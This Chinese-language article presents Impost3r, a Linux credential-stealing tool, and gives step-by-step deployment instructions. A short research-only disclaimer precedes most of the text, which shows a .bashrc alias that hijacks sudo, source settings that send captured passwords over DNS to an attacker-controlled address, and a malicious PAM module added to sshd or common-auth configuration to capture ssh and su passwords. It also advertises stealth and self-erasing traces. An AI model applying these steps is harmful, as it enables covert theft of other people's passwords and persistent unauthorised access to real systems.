![Impost3r.png](https://image.3001.net/images/20200610/1591785824_5ee0b96047dd7.png!small)

**Impost3r是一款针对Linux平台的密码管理工具，该工具采用C语言开发，可以帮助广大研究人员在渗透测试的过程中，从目标Linux主机中获取各类密码（ssh、su、sudo）。**

此工具仅限于安全研究和教学，请不要将其用于恶意目的。

## 功能特性

> 1、 自动擦除密码窃取行为痕迹；
>
> 2、 通过DNS协议传输结果；
>
> 3、 无需用户交互，用户无法察觉；

### 依赖组件

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/ph4ntonn/Impost3r.git

## 工具使用

Impost3r可以用来窃取包括sudo、su、ssh服务在内的密码，这三个服务可大致分为2类，sudo以及ssh/su，下面分两种情况讨论。

## 窃取sudo密码

仅需要普通用户权限即可，不要求一定是root，但只能窃取对应用户的密码，不能窃取其他用户的。

首先假设攻击者控制了一台服务器，权限为普通用户权限。拷贝一份用户的.bashrccp ～/.bashrc
/tmp/，并将这份副本放在攻击者自定义的路径下(本例中放置在`/tmp/`目录下，攻击者可以修改)。修改用户根目录下的`.bashrc(～/.bashrc)`，在最后一行添加如下语句(其中“`/tmp/.impost3r`”需要与下面的FILENAME保持一致)：

    
    
    alias sudo='impost3r() {
    if [ -f "/tmp/.impost3r" ]; then
    /tmp/.impost3r "$@" && unalias sudo
    else
    unalias sudo;sudo "$@"
    fi
    }; impost3r'

添加完成后，保存文件并执行：

    
    
    source ~/.bashrc

接着攻击者需要对Impost3r源代码`/sudo/main.c`进行修改：

    
    
    /*
     Custom setting
    */
    # define FILENAME "/tmp/.impost3r" \\设置Impost3r在目标服务器上的位置
    # define BACKUP_BASHRC "/tmp/.bashrc" \\设置攻击者备份的源.bashrc在目标服务器上的位置
    # define SAVE_OR_SEND 0 \\设置在窃取成功后是将结果保存在目标机器上或者是发送至攻击者控制的机器(发送=0，保存=1，默认为发送)
    /*
        Send to server
    */
    # define MAX_RESEND 30 \\设置当窃取到密码之后，Impost3r向攻击者服务器发送用户密码的最大重试次数
    # define RESEND_INTERVAL 5 \\设置每一次发送密码的间隔
    # define REMOTE_ADDRESS "192.168.0.12" \\设置回送密码的远程地址
    # define REMOTE_PORT 53 \\设置回送密码的远程端口
    /*
    Save to local
    */
    # define SAVE_LOCATION "/tmp/.cache" \\设置结果文件保存的位置，在SAVE_OR_SEND设置为1的情况下

``

修改完成后，保存并在当前目录执行：

    
    
    make

在当前目录下得到编译完成的`.impost3r`文件，上传`.impost3r`文件至目标服务器的`/tmp/`文件夹下(仅为示例，可自行修改，只需与源代码中定义相同即可)。攻击者在自己的服务器上启动dns服务端程序，等待合法用户使用sudo后获取密码。

注意事项：在窃取sudo密码的情况下，Impost3r在成功后将会自动擦除痕迹，并不需要攻击者上去手动清理。

## 窃取ssh/su密码

窃取ssh/su密码与上面sudo密码的窃取利用方法不同，要求必须是root权限,可以窃取任意用户密码

以Ubuntu为例，首先还是假设攻击者控制了一台服务器，通过一顿提权操作获得了root权限（或者可爱的管理员就是用root权限启动的服务），先编辑Impost3r的`/ssh_su/main.c`源代码文件。

    
    
    /*
    Custom setting
    */
    # define SSH_OR_BOTH 0 \\设置偷取模式，0代表仅偷取ssh密码，1代表偷取ssh及su密码，默认为0（后面会讲到区别）
    # define SAVE_OR_SEND 0 \\设置在窃取成功后是将结果保存在目标机器上或者是发送至攻击者控制的机器(发送=0，保存=1，默认为发送)
    /*
        Send to server
    */
    # define MAX_RESEND 30 \\设置当窃取到密码之后，Impost3r向攻击者服务器发送用户密码的最大重试次数(仅当SSH_OR_BOTH为0，此选项才有效)
    # define RESEND_INTERVAL 5 \\设置每一次发送密码的间隔(仅当SSH_OR_BOTH为0，此选项才有效)
    # define REMOTE_ADDRESS "192.168.0.12" \\设置回送密码的远程地址
    # define REMOTE_PORT 53 \\设置回送密码的远程端口
    /*
    Save to local
    */
    # define SAVE_LOCATION "/tmp/.sshsucache" \\设置结果文件保存的位置，在SAVE_OR_SEND设置为1的情况下

修改完成后，保存并在当前目录下执行：

    
    
    make

得到编译好的文件`impost3r.so`，将编译完成的`impost3r.so`上传至目标机器的`/lib/x86_64-linux-gnu/security`下(不同机器可能文件夹名不同，请根据情况放置)。进入`/etc/pam.d`下，这时分两种情况，如果选择的模式是仅偷取ssh密码，那么就需要执行`vi
sshd`,在文件的最后添加如下语句：

` `

    
    
    auth optional impost3r.so
    account optional impost3r.so​

` `

保存并退出，重启sshd服务：

    
    
    service sshd restart

而如果选择的是ssh和su密码一起偷取，那么就需要执行：

    
    
    vi common-auth

添加相同语句，保存并退出后同样重启sshd服务。攻击者在自己的服务器上启动dns服务端程序，等待合法用户使用ssh登陆目标机器或者使用su切换用户后获取密码。

注意事项：在窃取ssh/su密码的情况下，Impost3r由于权限原因无法清除痕迹，需要攻击者自己去清除。

## 项目地址

Impost3r：【[ _GitHub传送门_](https://github.com/ph4ntonn/Impost3r)】

